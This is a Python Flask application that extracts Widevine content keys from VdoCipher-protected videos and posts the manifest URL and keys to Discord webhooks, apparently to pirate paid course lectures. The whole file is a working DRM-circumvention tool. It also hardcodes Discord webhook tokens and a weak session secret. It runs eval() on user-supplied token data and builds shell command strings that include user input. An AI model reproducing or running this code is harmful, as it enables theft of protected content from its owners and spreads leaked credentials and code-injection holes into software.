from flask import Flask, render_template, request, redirect, url_for, session

import base64
import json
import requests , re 
from pywidevine.cdm import deviceconfig
from pywidevine.cdm import cdm
import datetime
import os 

Nawar = 'https://discord.com/api/webhooks/1159805446039797780/bE4xU3lkcjlb4vfCVQ9ky5BS2OuD01Y8g9godljNBfoApGt59-VfKf19GQuMUmH0IYzw'
Bio= "https://discord.com/api/webhooks/1158548096012259422/jQ5sEAZBIrvfBNTA-w4eR-p6Yw0zv7GBC9JTUcEOAWfmqYJXbOpgysATjKPXLwd8HZOs"
Nasser = "https://discord.com/api/webhooks/1158548163209199626/73nAC_d1rgUr6IS79gC508Puood83ho848IEGOpxLtUzGEEJ3h8CyZqlZvCZ6jEXH5k1"
Salama = "https://discord.com/api/webhooks/1158548226971009115/qtBWD8plfY3JFMjCKYrcXwJ8ayMIbUnXFU3_XtbPeXdxGBzb794t8oSKB2WjoN05Lc-j"
Gedo = "https://discord.com/api/webhooks/1158824183833309326/lOGuL_T9mAtYuGCkDRkVxRERIQAD1fHS3RTzxkRmS1ZlzT5yY4C7bi20XdK-1pSXcVzZ"






def save_log(content, log_folder="logs"):
    # Create the log folder if it doesn't exist
    if not os.path.exists(log_folder):
        os.makedirs(log_folder)

    # Get the current timestamp
    current_time = datetime.datetime.now()
    timestamp = current_time.strftime("%Y-%m-%d_%H-%M-%S")  # You can format the timestamp as desired

    # Create the log file with the timestamp as the name and write the content to it
    log_filename = os.path.join(log_folder, f"{timestamp}.txt")

    with open(log_filename, "w") as log_file:
        log_file.write(content)




















#The code on the html
def generate_input1(mpd, content_key, vidname):
    ffmpegcmd = f"move {vidname}.mp4 ./output"
    input1 = f"app {mpd}\n--key " + "\n--key ".join(content_key) + f"\n--save-name {vidname} -M format=mp4 & {ffmpegcmd}"
    return input1




#get otp from token2
def getotp(token):
    decoded_bytes = base64.b64decode(token)
    decoded_string = decoded_bytes.decode('utf-8')
    data = json.loads(decoded_string)
    otp_value = data.get("otp")
    return (otp_value)



def playback(token):
    decoded_bytes = base64.b64decode(token)
    decoded_string = decoded_bytes.decode('utf-8')
    data = json.loads(decoded_string)
    playbackInfo = data.get("playbackInfo")
    return (playbackInfo)

#Video ID for mpd and pssh
def get_video_id(token: str):
    playback_info = json.loads(base64.b64decode(token))['playbackInfo']
    return json.loads(base64.b64decode(playback_info))['videoId']
#pssh
def get_pssh(mpd: str):
    req = None
    req = requests.get(mpd)
    return re.search('<cenc:pssh>(.*)</cenc:pssh>', req.text).group(1)


#mpd
def get_mpd(video_id: str) -> str:
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        'origin': 'https://dev.vdocipher.com/',
        'referer': 'https://dev.vdocipher.com/'
    }
    url = 'https://dev.vdocipher.com/api/meta/' + video_id
    req = None
    req = requests.get(url, headers=headers)
    resp = req.json()
    return resp['dash']['manifest']
#forthename
def namecheck(input_string):
    pattern = r'^[a-zA-Z0-9]+$'
    if re.match(pattern, input_string):
        return True
    else:
        return False
#Defult
app = Flask(__name__)
app.secret_key = 'spypassword123'


@app.route('/', methods=['GET', 'POST'])
def index():
    mytoken = request.args.get('token')
    url = request.args.get('url')
    mytoken2 = mytoken
    class WvDecrypt:
        def __init__(self, pssh_b64, device):
            self.cdm = cdm.Cdm()
            self.session = self.cdm.open_session(pssh_b64, device)
    
        def create_challenge(self):
            challenge = self.cdm.get_license_request(self.session)
            return challenge
    
        def decrypt_license(self, license_b64):
            if self.cdm.provide_license(self.session, license_b64) == 1:
                raise ValueError
    
        def set_server_certificate(self, certificate_b64):
            if self.cdm.set_service_certificate(self.session, certificate_b64) == 1:
                raise ValueError
    
        def get_content_key(self):
            content_keys = []
            for key in self.cdm.get_keys(self.session):
                if key.type == 'CONTENT':
                    kid = key.kid.hex()
                    key = key.key.hex()
    
                    content_keys.append('{}:{}'.format(kid, key))
    
            return content_keys
    
        def get_signing_key(self):
            for key in self.cdm.get_keys(self.session):
                if key.type == 'SIGNING':
                    kid = key.kid.hex()
                    key = key.key.hex()
    
                    signing_key = '{}:{}'.format(kid, key)
                    return signing_key
    
    def headers():

        return {
        'Content-Type': "application/json",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "connection": "keep-alive",
        "host": "player.vdocipher.com",
    #   "referer": "https://dashboard.elhusseinyusmleprep.com/",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "iframe",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "cross-site",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": '1',
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
    }
    
    
    class Pyd:
        def __init__(self) -> None:
            pass

        def post_license_request(self, link, challenge, data):
            if challenge == "":
                enoded = base64.b64encode(challenge.encode()).decode()
            else:
                enoded = base64.b64encode(challenge).decode()
            myotp = getotp(mytoken2)
            data['otp'] = f"{myotp}"
            data["licenseRequest"] = enoded
            
            payload_new = {
                'token': base64.b64encode(json.dumps(data).encode("utf-8")).decode('utf-8')
            }
            r = requests.post(link, json=payload_new, headers=headers())
            return r.json()['license']
    
        def start(self):
            license_url = "https://license.vdocipher.com/auth"
            video_id = get_video_id(mytoken)
            mpd = get_mpd(video_id)
            pssh = get_pssh(mpd)
            pssh_b64 = f"{pssh}"
            data = {"token":f"{mytoken}"}
            data = eval(base64.b64decode(data['token']).decode())
            wvdecrypt = WvDecrypt(pssh_b64, deviceconfig.DeviceConfig(deviceconfig.device_android_generic))
            wvdecrypt.set_server_certificate(self.post_license_request(license_url, '', data))
            challenge = wvdecrypt.create_challenge()
            license = self.post_license_request(license_url, challenge, data)
            wvdecrypt.decrypt_license(license)
            content_key = wvdecrypt.get_content_key()
            return content_key 
        
    video_id = get_video_id(mytoken)
    mpd = get_mpd(video_id)

    if __name__ == '__main__':
        pyd2 = Pyd()
        content_key = pyd2.start()

    #code = generate_input1(mpd, content_key, "vidname")
    content_key_lines = '\n'.join([f'--key {key}' for key in content_key])
    result = mpd + '\n' + content_key_lines
    print(result)
    session['result'] = result
    session['url'] = url
    options = ['Else','Nawar','Nasser-El-Batal', 'MoSalama', 'Gedo' , 'Bio']
    save_log(result)

    return render_template('index.html' , content_key = content_key , mpd = mpd , options= options , url = url,result = result)








#END PAGE



@app.route('/form', methods=['POST'])
def form():
    options = ['Nawar', 'Nasser-El-Batal', 'MoSalama' , 'Bio', 'Else']
    if request.method == 'POST':
        user_data = {
            'teacher' : request.form.get('dropdown'),
            'name': request.form['vidname']
        }
        return redirect(url_for('discord', **user_data))
    return render_template('index.html' , option = options)


@app.route('/discord', methods=['GET', 'POST'])
def discord():
    result = session.get('result')
    url = session.get('url')  
    name = request.args.get('name')
    teacher = request.args.get('teacher')
    result = result.replace("\n", " ")

    if url :  
        msg = f'<{url}>```app {result} --save-name {name} -M format=mp4 & move {name}.mp4 ./output``` {name}'

    msg = f'```app {result} --save-name {name} -M format=mp4 & move {name}.mp4 ./output``` {name}'
    message = {
            'content': f'{msg}'
        }
    payload = json.dumps(message)
    headers = {'Content-Type': 'application/json'}
    if teacher == "Nawar" : 
        webhook_url = Nawar
    elif teacher == "Nasser-El-Batal":
        webhook_url = Nasser
    elif teacher == "MoSalama":
        webhook_url = Salama
    elif teacher == "Bio":
        webhook_url = Bio   
    elif teacher == "Gedo":
        webhook_url = Gedo
    else :
        webhook_url = "https://discord.com/api/webhooks/1158548386392309831/V3d-iMhY0-cwU6TZ9bS8OZZEoKtqicbSzw6AjbB-pUaSiFvr-bEVZduwkwcYzPpIRGCk"
    requests.post(webhook_url, data=payload, headers=headers)
    return "Message Sent!" 


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=6969)